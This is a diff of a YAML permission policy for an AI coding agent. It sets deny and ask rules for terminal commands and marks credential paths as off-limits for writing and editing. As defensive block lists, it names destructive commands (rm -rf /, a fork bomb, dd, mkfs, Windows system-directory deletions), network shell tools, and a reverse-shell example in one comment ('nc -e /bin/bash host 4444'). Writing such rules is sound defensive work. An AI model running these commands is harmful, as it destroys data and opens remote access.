@@ -7,77 +7,27 @@
 # matches in any tier, the implicit default is `ask`.
 #
 # Pattern rules (for `terminal`) are case-sensitive SUBSTRING matches
-# against the input command. Exception: a pattern ending in `/` or `~`
-# (a filesystem-root marker) only matches when that marker ends an
-# argument, so `rm -rf /` blocks a root wipe but not `rm -rf /path/under`.
+# against the input command, with two refinements:
+#   - a pattern ending in `/` or `~` (a filesystem-root marker) only matches
+#     when that marker ends an argument, so `rm -rf /` blocks a root wipe but
+#     not `rm -rf /path/under`;
+#   - a pattern starting with `^` is command-position anchored: it matches the
+#     command word itself (also after sudo/env/xargs wrappers, flags, and
+#     chain operators like `;`/`&&`), not incidental text inside arguments —
+#     `^nc` matches `nc -e /bin/bash host 4444` but not `rg "func "`.
 # Path rules use glob syntax with `**` meaning
 # "any number of directory components". Hostname rules use glob with `*`
 # matching a single label (so `*.dev` matches `foo.dev` but not `foo.bar.dev`).
 
 terminal:
-  # Absolute disasters — never ask, always deny.
+  # Absolute disasters — never ask, always deny. These predate the hardcoded
+  # engine-level guards (permission.applyHardcodedDenyRules), which are the
+  # single source for the full catastrophe list (disk destruction, power
+  # commands, system-directory removal, …) and apply even over a user
+  # override of this file.
   - deny:  { pattern: "rm -rf /" }
   - deny:  { pattern: "rm -rf ~" }
   - deny:  { pattern: ":(){ :|:& };:" }   # fork bomb
-  # Disk / filesystem operations that can destroy data or brick the host.
-  - deny:  { pattern: "dd if=" }          # raw disk writes (e.g. dd if=/dev/zero of=/dev/sda)
-  - deny:  { pattern: "mkfs" }              # filesystem creation (mkfs, mkfs.ext4, ...)
-  - deny:  { pattern: "fdisk " }            # partition manipulation
-  - deny:  { pattern: "parted " }           # partition manipulation
-  - deny:  { pattern: "diskutil erase" }    # macOS disk erasure
-  - deny:  { pattern: "diskutil partition" } # macOS partitioning
-  # System-wide destructive operations.
-  - deny:  { pattern: "shutdown " }         # power-off / reboot commands
-  - deny:  { pattern: "poweroff" }
-  - deny:  { pattern: "halt " }
-  - deny:  { pattern: "init 0" }
-  - deny:  { pattern: "reboot " }
-  - deny:  { pattern: "systemctl poweroff" }
-  - deny:  { pattern: "systemctl reboot" }
-  - deny:  { pattern: "kill -9 -1" }        # kill every process the user owns
-  - deny:  { pattern: "kill -SIGKILL -1" }
-  # System directory removal — deleting /usr, /bin, /System, etc. bricks the OS.
-  # These are also the canonical Windows paths an LLM might emit via rm -rf
-  # (PowerShell aliases Remove-Item to rm) or via cmd/powershell.
-  - deny:  { pattern: "rm -rf /usr" }
-  - deny:  { pattern: "rm -rf /bin" }
-  - deny:  { pattern: "rm -rf /sbin" }
-  - deny:  { pattern: "rm -rf /boot" }
-  - deny:  { pattern: "rm -rf /lib" }
-  - deny:  { pattern: "rm -rf /lib64" }
-  - deny:  { pattern: "rm -rf /System" }
-  - deny:  { pattern: "rm -rf /Windows" }
-  - deny:  { pattern: "rm -rf C:\\Windows" }
-  - deny:  { pattern: "rm -rf C:\\Windows\\System32" }
-  - deny:  { pattern: "rm -rf C:\\ProgramData" }
-  - deny:  { pattern: "rm -rf C:\\Program Files" }
-  - deny:  { pattern: "rm -rf C:\\Program Files (x86)" }
-  - deny:  { pattern: "rm -rf \"C:\\Windows\"" }
-  - deny:  { pattern: "rm -rf \"C:\\Program Files\"" }
-  - deny:  { pattern: "rm -rf \"C:\\Program Files (x86)\"" }
-  # The unquoted Unix-style /Program Files won't actually delete the directory
-  # (shell splits it into two args), but an LLM may still emit it, so we deny
-  # the intent rather than letting half of it slip through to ask.
-  - deny:  { pattern: "rm -rf /Program Files" }
-  - deny:  { pattern: "rm -rf /Program Files/Foo" }
-  # Windows cmd/powershell recursive deletion variants.
-  - deny:  { pattern: "rmdir /s /q C:\\Windows" }
-  - deny:  { pattern: "rmdir /s /q \"C:\\Windows\"" }
-  - deny:  { pattern: "rmdir /s /q C:\\Program Files" }
-  - deny:  { pattern: "rmdir /s /q \"C:\\Program Files\"" }
-  - deny:  { pattern: "rd /s /q C:\\Windows" }        # alias for rmdir
-  - deny:  { pattern: "rd /s /q \"C:\\Windows\"" }
-  - deny:  { pattern: "del /s /q C:\\Windows" }
-  - deny:  { pattern: "del /s /q \"C:\\Windows\"" }
-  - deny:  { pattern: "erase /s /q C:\\Windows" }
-  - deny:  { pattern: "erase /s /q \"C:\\Windows\"" }
-  # PowerShell aliases for Remove-Item targeting Windows system dirs.
-  - deny:  { pattern: "ri -r -fo C:\\Windows" }
-  - deny:  { pattern: "ri -r -fo \"C:\\Windows\"" }
-  - deny:  { pattern: "del -r -fo C:\\Windows" }
-  - deny:  { pattern: "del -r -fo \"C:\\Windows\"" }
-  - deny:  { pattern: "erase -r -fo C:\\Windows" }
-  - deny:  { pattern: "erase -r -fo \"C:\\Windows\"" }
   # Risky but legitimate — confirm interactively.
   - ask:   { pattern: "rm -rf" }
   - ask:   { pattern: "rm -fr" }
@@ -90,51 +40,54 @@ terminal:
   - ask:   { pattern: "wget " }
   - ask:   { pattern: "ssh " }
   - ask:   { pattern: "scp " }
-  - ask:   { pattern: "nc " }              # netcat
-  - ask:   { pattern: "ncat " }
-  - ask:   { pattern: "socat " }
-  - ask:   { pattern: "nmap " }            # port scanning
+  - ask:   { pattern: "^nc" }               # netcat
+  - ask:   { pattern: "^ncat" }
+  - ask:   { pattern: "^socat" }
+  - ask:   { pattern: "^nmap" }             # port scanning
   # System administration that affects the whole machine.
-  - ask:   { pattern: "systemctl " }        # system services
-  - ask:   { pattern: "iptables " }         # Linux firewall
-  - ask:   { pattern: "ip6tables " }        # Linux firewall
-  - ask:   { pattern: "pfctl " }             # macOS firewall
-  - ask:   { pattern: "crontab " }           # scheduled jobs
-  - ask:   { pattern: "launchctl " }         # macOS services
-  - ask:   { pattern: "diskutil " }         # macOS disk utilities (other than erase/partition, denied above)
+  - ask:   { pattern: "^systemctl" }        # system services (poweroff/reboot denied by hardcoded guards)
+  - ask:   { pattern: "^iptables" }         # Linux firewall
+  - ask:   { pattern: "^ip6tables" }        # Linux firewall
+  - ask:   { pattern: "^pfctl" }            # macOS firewall
+  - ask:   { pattern: "^crontab" }          # scheduled jobs
+  - ask:   { pattern: "^launchctl" }        # macOS services
+  - ask:   { pattern: "^diskutil" }         # macOS disk utilities (erase/partition denied by hardcoded guards)
   # Container cleanup that can destroy environments.
-  - ask:   { pattern: "docker rm -f " }     # force-remove containers
-  - ask:   { pattern: "docker rmi -f " }    # force-remove images
-  - ask:   { pattern: "docker system prune" } # bulk deletion
+  - ask:   { pattern: "^docker rm -f" }     # force-remove containers
+  - ask:   { pattern: "^docker rmi -f" }    # force-remove images
+  - ask:   { pattern: "^docker system prune" } # bulk deletion
   # Disk-space exhaustion.
-  - ask:   { pattern: "fallocate -l " }     # preallocate large files
-  - ask:   { pattern: "truncate -s " }       # grow files arbitrarily
-  # Windows / PowerShell dangers. Matching is case-sensitive substring and
-  # PowerShell is case-insensitive with aliases, so these catch the canonical
-  # forms an LLM typically emits — anything missed still falls through to the
-  # implicit `ask` (prompt in interactive, deny in strict), never auto-run.
-  # (`rm -rf` above already covers the PowerShell `rm` alias.)
+  - ask:   { pattern: "^fallocate -l" }     # preallocate large files
+  - ask:   { pattern: "^truncate -s" }      # grow files arbitrarily
+  # Windows / PowerShell dangers. Matching is case-sensitive and PowerShell is
+  # case-insensitive with aliases, so these catch the canonical forms an LLM
+  # typically emits — anything missed still falls through to the implicit
+  # `ask` (prompt in interactive, deny in strict), never auto-run.
+  # (`rm -rf` above already covers the PowerShell `rm` alias; system-dir
+  # targets of every deletion spelling are denied by the hardcoded guards.)
   - deny:  { pattern: "Remove-Item -Recurse -Force" }
   - deny:  { pattern: "Remove-Item -Force -Recurse" }
   - deny:  { pattern: "Format-Volume" }
-  # Windows system administration that can brick or unconfigure the OS.
-  - deny:  { pattern: "diskpart " }           # partition / volume management
-  - deny:  { pattern: "reg delete " }         # registry deletion
-  - deny:  { pattern: "bcdedit " }            # boot configuration
-  - deny:  { pattern: "wbadmin delete " }     # backup catalog deletion
-  - deny:  { pattern: "dism " }               # system image modification
-  - deny:  { pattern: "vssadmin delete " }    # shadow copy deletion
-  - ask:   { pattern: "wmic " }             # Windows Management Instrumentation
-  - ask:   { pattern: "sc " }                 # service control
-  - ask:   { pattern: "schtasks " }           # scheduled tasks
-  - ask:   { pattern: "netsh " }              # network shell
-  - ask:   { pattern: "icacls " }             # permissions
-  - ask:   { pattern: "takeown " }            # ownership seizure
-  - ask:   { pattern: "robocopy " }           # can overwrite system dirs
-  - ask:   { pattern: "xcopy " }               # can overwrite system files
-  - ask:   { pattern: "mklink " }             # can link into system dirs
-  - ask:   { pattern: "powershell " }         # arbitrary PowerShell code
-  - ask:   { pattern: "cmd /c " }             # arbitrary cmd code
+  # Untargeted recursive deletion — the cmd.exe counterpart of `rm -rf`.
+  - ask:   { pattern: "^rmdir /s /q" }
+  - ask:   { pattern: "^rd /s /q" }
+  - ask:   { pattern: "^del /s /q" }
+  - ask:   { pattern: "^erase /s /q" }
+  # Windows system administration — risky but has legitimate uses.
+  - ask:   { pattern: "^wmic" }             # Windows Management Instrumentation
+  - ask:   { pattern: "^sc" }               # service control
+  - ask:   { pattern: "^schtasks" }         # scheduled tasks
+  - ask:   { pattern: "^netsh" }            # network shell
+  - ask:   { pattern: "^icacls" }           # permissions
+  - ask:   { pattern: "^takeown" }          # ownership seizure
+  - ask:   { pattern: "^robocopy" }         # can overwrite system dirs
+  - ask:   { pattern: "^xcopy" }            # can overwrite system files
+  - ask:   { pattern: "^mklink" }           # can link into system dirs
+  - ask:   { pattern: "^dism" }             # system image servicing (also has read-only uses)
+  - ask:   { pattern: "^fsutil" }           # filesystem utilities (createnew et al. are benign)
+  - ask:   { pattern: "^sdelete" }          # secure delete (targeted, like rm)
+  - ask:   { pattern: "^powershell" }       # arbitrary PowerShell code
+  - ask:   { pattern: "^cmd /c" }           # arbitrary cmd code
   - ask:   { pattern: "Invoke-Expression" }        # arbitrary code (alias: iex)
   - ask:   { pattern: "Invoke-WebRequest" }        # download / exfiltrate (alias: iwr)
   - ask:   { pattern: "Invoke-RestMethod" }        # alias: irm
@@ -183,13 +136,13 @@ web_fetch:
 # write access (cron task sessions, `octo init`'s own output file) get it
 # explicitly — via that session's permission_mode or via allowWriteRoots —
 # not through a rule here.
+# (System directories — /bin, /usr, C:/Windows, … — are denied by the
+# hardcoded engine-level guards, which also survive a user override.)
 write_file:
-  - deny:  { path: ["**/.ssh/**", "/etc/**", "**/.env", "**/.env.*", "**/id_rsa*", "**/id_ed25519*", "**/id_ecdsa*",
-                    "/bin/**", "/sbin/**", "/usr/bin/**", "/usr/sbin/**", "/System/**", "/boot/**", "/lib/**", "/lib64/**"] }
+  - deny:  { path: ["**/.ssh/**", "/etc/**", "**/.env", "**/.env.*", "**/id_rsa*", "**/id_ed25519*", "**/id_ecdsa*"] }
 
 edit_file:
-  - deny:  { path: ["**/.ssh/**", "/etc/**", "**/.env", "**/.env.*", "**/id_rsa*", "**/id_ed25519*", "**/id_ecdsa*",
-                    "/bin/**", "/sbin/**", "/usr/bin/**", "/usr/sbin/**", "/System/**", "/boot/**", "/lib/**", "/lib64/**"] }
+  - deny:  { path: ["**/.ssh/**", "/etc/**", "**/.env", "**/.env.*", "**/id_rsa*", "**/id_ed25519*", "**/id_ecdsa*"] }
 
 # read_file is generally safe; only block the obvious credential bombs.
 read_file:
